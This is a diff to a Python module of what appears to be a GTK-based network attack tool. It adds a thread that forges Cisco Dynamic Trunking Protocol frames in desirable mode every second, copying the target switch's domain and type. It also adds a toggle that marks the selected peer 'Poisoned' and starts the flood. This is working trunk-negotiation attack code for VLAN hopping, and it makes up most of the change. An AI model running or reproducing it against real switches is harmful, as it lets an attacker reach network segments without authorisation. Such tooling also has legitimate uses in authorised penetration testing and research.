@@ -118,12 +118,48 @@ class dtp_tlv(object):
     def render(self):
         return struct.pack("!HH", self.t, len(self.v)+4) + self.v
 
+class dtp_thread(threading.Thread):
+    def __init__(self, parent):
+        threading.Thread.__init__(self)
+        self.parent = parent
+        self.running = True
+
+    def run(self):
+        self.parent.log("DTP: Thread started")
+        while self.running:
+            if not self.parent.target is None:
+                pdu = dtp_pdu(1, [  dtp_tlv(0x1, parent.target["pdu"].get_tlv(0x1).v),
+                                    dtp_tlv(0x2, "\x81"),
+                                    dtp_tlv(0x3, parent.target["pdu"].get_tlv(0x3).v),
+                                    dtp_tlv(0x4, self.parent.mac)
+                                 ] )
+            else:
+                pdu = dtp_pdu(1, [  dtp_tlv(0x1, ""),
+                                    dtp_tlv(0x2, "\x81"),
+                                    dtp_tlv(0x3, "\xa5"),
+                                    dtp_tlv(0x4, self.parent.mac)
+                                 ] )
+            pkg = "\xaa\xaa\x03\x00\x00\x0c\x20\x04" + pdu.render()
+            eth_hdr = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(DTP_DEST_MAC),
+                                                src=self.parent.mac,
+                                                type=len(pkg),
+                                                data=pkg
+                                                )
+            self.parent.dnet.send(str(eth_hdr))
+            time.sleep(1)
+        self.parent.log("DTP: Thread terminated")
+
+    def shutdown(self):
+        self.running = False
+
+
 class mod_class(object):
     STORE_SRC_ROW = 0
     STORE_DOMAIN_ROW = 1
     STORE_STATUS_ROW = 2
     STORE_TRUNK_ROW = 3
     STORE_SENDER_ROW = 4
+    STORE_STATE_ROW = 5
     
     def __init__(self, parent, platform):
         self.parent = parent
@@ -131,13 +167,14 @@ class mod_class(object):
         self.name = "dtp"
         self.group = "CISCO"
         self.gladefile = "/modules/module_dtp.glade"
-        self.liststore = gtk.ListStore(str, str, str, str, str)
+        self.liststore = gtk.ListStore(str, str, str, str, str, str)
         self.thread = None
         self.mac = "\x00\x00\x00\x00\x00\x00"
 
     def start_mod(self):
         self.peers = {}
-        #~ self.thread = hsrp_thread(self)
+        self.thread = dtp_thread(self)
+        self.target = None
 
     def shut_mod(self):
         if self.thread:
@@ -147,10 +184,9 @@ class mod_class(object):
         
     def get_root(self):
         self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
-        #~ dic = { "on_get_button_clicked" : self.on_get_button_clicked,
-                #~ "on_release_button_clicked" : self.on_release_button_clicked
-                #~ }
-        #~ self.glade_xml.signal_autoconnect(dic)
+        dic = { "on_get_button_toggled" : self.on_get_button_toggled,
+                }
+        self.glade_xml.signal_autoconnect(dic)
 
         self.treeview = self.glade_xml.get_widget("treeview")
         self.treeview.set_model(self.liststore)
@@ -186,9 +222,13 @@ class mod_class(object):
         column.pack_start(render_text, expand=True)
         column.add_attribute(render_text, 'text', self.STORE_SENDER_ROW)
         self.treeview.append_column(column)
-
-        #~ self.arp_checkbutton = self.glade_xml.get_widget("arp_checkbutton")
-
+        column = gtk.TreeViewColumn()
+        column.set_title("STATE")
+        render_text = gtk.CellRendererText()
+        column.pack_start(render_text, expand=True)
+        column.add_attribute(render_text, 'text', self.STORE_STATE_ROW)
+        self.treeview.append_column(column)
+        
         return self.glade_xml.get_widget("root")
 
     def log(self, msg):
@@ -227,7 +267,8 @@ class mod_class(object):
                                                                     str(domain),
                                                                     str(status),
                                                                     str(trunk),
-                                                                    str(sender)
+                                                                    str(sender),
+                                                                    ""
                                                                     ] )
                             }
                 self.peers[src] = peer
@@ -241,28 +282,21 @@ class mod_class(object):
                                   )
     # SIGNALS #
 
-    #~ def on_get_button_clicked(self, btn):
-        #~ select = self.treeview.get_selection()
-        #~ (model, paths) = select.get_selected_rows()
-        #~ for i in paths:
-            #~ iter = model.get_iter(i)
-            #~ peer = dnet.ip_aton(model.get_value(iter, self.STORE_SRC_ROW))
-            #~ (iter, pkg, run, arp) = self.peers[peer]
-            #~ if self.arp_checkbutton.get_active():
-                #~ arp = 3
-            #~ else:
-                #~ arp = 0
-            #~ self.peers[peer] = (iter, pkg, True, arp)
-            #~ model.set_value(iter, self.STORE_STATE_ROW, "Taken")
-        #~ if not self.thread.is_alive():
-            #~ self.thread.start()
-#~ 
-    #~ def on_release_button_clicked(self, btn):
-        #~ select = self.treeview.get_selection()
-        #~ (model, paths) = select.get_selected_rows()
-        #~ for i in paths:
-            #~ iter = model.get_iter(i)
-            #~ peer = dnet.ip_aton(model.get_value(iter, self.STORE_SRC_ROW))
-            #~ (iter, pkg, run, arp) = self.peers[peer]
-            #~ self.peers[peer] = (iter, pkg, False, arp)
-            #~ model.set_value(iter, self.STORE_STATE_ROW, "Released")
+    def on_get_button_toggled(self, btn):
+        if btn.get_active():
+            select = self.treeview.get_selection()
+            (model, paths) = select.get_selected_rows()
+            for i in paths:
+                iter = model.get_iter(i)
+                self.target = self.peers[model.get_value(iter, self.STORE_SRC_ROW)]
+                model.set_value(iter, self.STORE_STATE_ROW, "Poisoned")
+            if not self.thread.is_alive():
+                self.thread.start()
+        else:
+            self.liststore.set( self.target["row_iter"],
+                                self.STORE_STATE_ROW, "")
+            self.target = None
+            if self.thread:
+                if self.thread.is_alive():
+                    self.thread.shutdown()
+            
